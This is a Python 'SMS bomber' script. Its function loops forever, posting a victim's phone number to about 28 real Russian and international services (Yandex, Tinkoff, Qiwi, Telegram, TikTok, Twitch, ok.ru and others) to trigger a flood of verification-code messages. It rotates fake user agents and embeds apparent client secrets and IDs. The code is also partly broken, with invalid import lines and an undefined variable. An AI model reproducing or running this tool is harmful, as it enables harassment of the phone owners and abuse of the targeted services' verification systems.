pip in UserAgent 
from fake_useragent import UserAgent
ua = UserAgent(fallback='Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36')
headers = {'User-Agent':ua.chrome}
 
import UesrAgent
import os, sys
import fake_useragent
import requests
from colorama import *
init()




ua = UserAgent ()
print (ua.random)




x = 0
y = 0


def effect(message):
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()



def _sms(phone):
    global x, y
    user = fake_useragent.UserAgent().random
    headers1 = {'user_agent': user}
    print(Fore.YELLOW)

    effect(message22)

    while True:
        try:
            a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                          json={"reqId": "91101-1606335718",
                                "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                           "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers1, timeout=5.05)
            x += 1
        except:
            y += 1
        try:
            a = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/", data={"FastAuthorizationLoginLoadForm[login]" : phone}, headers=headers1, timeout=5.05)
            x += 1
        except:
            y += 1
        try:
            a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers1, timeout=5.05)
            x += 1
        except:
            y += 1
        try:
            a = requests.post("https://taxi.yandex.ru/3.0/auth",
                          json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers1, timeout=5.05)
            x += 1
        except:
            y += 1
        try:
            a = requests.post("https://youla.ru/web-api/auth/request_code",
                          json={"phone": phone}, headers=headers1, timeout=5.05)
            x += 1
        except:
            y += 1
        try:
            a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
                "msisdn": phone,
                "locale": "en",
                "countryCode": "ru",
                "version": "1",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "46763"
                }, headers=headers1, timeout=5.05)
            x += 1
        except:
            y += 1
        try:
            a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                          json={"phone_number": phone}, headers=headers1, timeout=5.05)
            x += 1
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                          data={"phone": phone}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                          data={"st.r.phone": "+" + phone}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://nn-card.ru/api/1.0/register",
                              json={"phone": phone, "password": 'DDd7873456'}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                          json={"CellPhone": phone[1:]}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post(
            "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                          data={"l": phone[1:]}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                          data={"CellPhone": phone[1:]}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                          json={"lastName": "", "firstName": "", "middleName": "",
                                "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://m.tiktok.com/node-a/send/download_link",  json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone[1:],"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://api.sunlight.net/v3/customers/authorization/",  data={"phone": phone}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
            json={
            "phone": "+" + phone,
            "api": 2,
            "email": 'dgirherfib@gmaqil.com',
            "x-email": "x-email",
            }, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
            data={
            "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
            "username": phone,
            "client_id": "android-qw",
            "client_secret": "zAm4FKq9UnSe7id",
            }, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                             json={"phone": "+" + phone}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
            json={
            "birthday": {"day": 12, "month": 10, "year": 2000},
            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
            "include_verification_code": True,
            "password": 'Danil5564554',
            "phone_number": phone,
            "username": 'bhtrtrrrtbhtrbhtr',
            }, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post("https://my.telegram.org/auth/send_password",
            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
            params={'msisdn': phone}, headers=headers1, timeout=5.05)
        except:
            y += 1
        try:
            x += 1
            a = requests.post('https://www.etm.ru/cat/runprog.html',
            data={'m_phone': phone, 'mode': 'sendSms', 'syf_prog': 'clients-services', 'getSysParam': 'yes'}, headers=headers1, timeout=5.05)
        except:
            y += 1
                
        try:
            x += 1
            requests.post(
                "https://www.icq.com/smsreg/requestPhoneValidation.php",
                data={
                    "msisdn": phone,
                    "locale": "en",
                    "countryCode": "ru",
                    "version": "1",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763",
                },
            )
        except:
            y += 1

        try:
            x += 1
            requests.post(
                "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                data={"st.r.phone": "+" + phone},
            )
        except:
            y += 1


        try:
            x += 1
            requests.post(
                "https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": "+" + phone},
            )
        except:
            y += 1


        try:
            x += 1
            requests.post(
                "https://www.citilink.ru/registration/confirm/phone/+" + phone + "/"
            )
        except:
            y += 1
